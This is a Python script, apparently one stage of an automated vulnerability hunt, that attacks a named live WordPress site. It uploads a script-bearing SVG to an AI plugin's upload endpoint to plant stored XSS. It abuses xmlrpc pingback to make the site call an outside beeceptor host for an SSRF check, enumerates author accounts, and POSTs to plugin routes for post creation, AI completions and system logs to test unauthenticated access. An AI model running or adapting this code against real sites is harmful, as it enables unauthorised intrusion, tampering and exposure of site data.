#!/usr/bin/env python3
"""Wave12 GHA: SVG XSS escalation, xmlrpc pingback OOB, author enum, MWAI route POST sweep."""
from __future__ import annotations

import json
import re
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
from pathlib import Path

TARGET = "https://kznvip.co.za"
OUT = Path("artifacts")
OUT.mkdir(exist_ok=True)
Path("out").mkdir(exist_ok=True)

R = {"ts": time.time(), "confirmed": [], "leads": [], "probes": {}}


def http(method, url, data=None, headers=None, timeout=35):
    h = {"User-Agent": "Mozilla/5.0 lurksek-wave12-gha", "Accept": "*/*"}
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, data=data, headers=h, method=method)
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, time.time() - t0, r.read(), dict(r.headers)
    except urllib.error.HTTPError as e:
        body = e.read() if hasattr(e, "read") else str(e).encode()
        return e.code, time.time() - t0, body, dict(getattr(e, "headers", {}) or {})
    except Exception as e:
        return 0, time.time() - t0, str(e).encode(), {}


def p(name, method, path, data=None, headers=None, timeout=35):
    url = path if path.startswith("http") else TARGET + path
    c, t, b, hdr = http(method, url, data=data, headers=headers, timeout=timeout)
    txt = b.decode("utf-8", "replace")
    R["probes"][name] = {"code": c, "time": round(t, 3), "body": txt[:800], "len": len(b)}
    print(f"{name} {c} {t:.2f}s", flush=True)
    return c, t, b, hdr, txt


# nonce
_, _, b, _, html = p("home", "GET", "/")
nonces = re.findall(r'"nonce"\s*:\s*"([a-f0-9]{8,12})"', html)
nonce = nonces[0] if nonces else None
R["nonce"] = nonce
auth = {"Accept": "application/json", "X-WP-Nonce": nonce} if nonce else {"Accept": "application/json"}

# SVG XSS with script
if nonce:
    svg = b'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert("F012_XSS")</script></svg>'
    boundary = "----W12" + uuid.uuid4().hex[:8]
    body = (
        f'--{boundary}\r\nContent-Disposition: form-data; name="file"; filename="xssw12.svg"\r\nContent-Type: image/svg+xml\r\n\r\n'.encode()
        + svg
        + f"\r\n--{boundary}--\r\n".encode()
    )
    c, _, b, _, txt = p(
        "svg_xss_upload",
        "POST",
        "/wp-json/mwai-ui/v1/files/upload",
        data=body,
        headers={**auth, "Content-Type": f"multipart/form-data; boundary={boundary}"},
    )
    try:
        j = json.loads(txt)
        url = j.get("data", {}).get("url") or j.get("url")
        if url:
            c2, _, b2, hdr2, txt2 = p("svg_xss_serve", "GET", url)
            ct = hdr2.get("Content-Type", "")
            has_script = "script" in txt2
            R["probes"]["svg_xss_serve"]["content_type"] = ct
            R["probes"]["svg_xss_serve"]["has_script"] = has_script
            if has_script and c2 == 200:
                R["confirmed"].append(
                    {"type": "stored_svg_xss", "url": url, "content_type": ct, "severity": "high"}
                )
    except Exception as e:
        R["probes"]["svg_xss_parse"] = str(e)

# OOB pingback via beeceptor
wh = f"https://{uuid.uuid4().hex[:10]}.free.beeceptor.com/w12pb"
R["beeceptor"] = wh
for tgt in [f"{TARGET}/", f"{TARGET}/about-us/"]:
    xml = (
        '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName>'
        f"<params><param><value><string>{wh}</string></value></param>"
        f"<param><value><string>{tgt}</string></value></param></params></methodCall>"
    ).encode()
    c, t, b, _, txt = p(
        f"pingback_{tgt.split('/')[-2] or 'root'}",
        "POST",
        "/xmlrpc.php",
        data=xml,
        headers={"Content-Type": "text/xml"},
        timeout=50,
    )
    fc = re.search(r"faultCode.*?<int>(-?\d+)</int>", txt, re.S)
    R["probes"][f"pingback_{tgt.split('/')[-2] or 'root'}"]["faultCode"] = fc.group(1) if fc else None

time.sleep(8)
c, _, b, _, wh_txt = p("beeceptor_poll", "GET", f"https://{wh.split('/')[2].split('.')[0]}.free.beeceptor.com/api/requests", timeout=15)
if c == 200 and len(wh_txt) > 20 and "[]" not in wh_txt[:50]:
    R["confirmed"].append({"type": "xmlrpc_pingback_ssrf_oob", "callback": wh, "hits": wh_txt[:500]})

# author enum
authors = []
for uid in range(1, 6):
    c, _, b, hdr, txt = p(f"author_{uid}", "GET", f"/?author={uid}")
    title = re.search(r"<title>([^<]+)</title>", txt)
    loc = hdr.get("Location", "")
    if c in (200, 301, 302) and title and "Page not found" not in title.group(1):
        authors.append({"id": uid, "title": title.group(1).split("&#8211;")[0].strip(), "location": loc})
R["authors"] = authors
if len(authors) > 1:
    R["leads"].append({"type": "author_enum", "authors": authors})

# MWAI POST sweep (guest nonce)
post_routes = [
    ("/wp-json/mwai/v1/helpers/create_post", {"title": "probe", "content": "x", "status": "draft"}),
    ("/wp-json/mwai/v1/ai/completions", {"messages": [{"role": "user", "content": "hi"}]}),
    ("/wp-json/mwai/v1/system/logs/list", {}),
]
for path, payload in post_routes:
    c, _, _, _, txt = p(
        f"post_{path.split('/')[-1]}",
        "POST",
        path,
        data=json.dumps(payload).encode(),
        headers={**auth, "Content-Type": "application/json"},
    )
    if c == 200 and "forbidden" not in txt.lower():
        R["leads"].append({"type": "mwai_unauth_post", "path": path, "body": txt[:300]})

for out in (OUT / "hunt_wave12_gha.json", Path("out/hunt_wave12_gha.json")):
    out.write_text(json.dumps(R, indent=2, default=str))
print("DONE confirmed", len(R["confirmed"]), "leads", len(R["leads"]), flush=True)
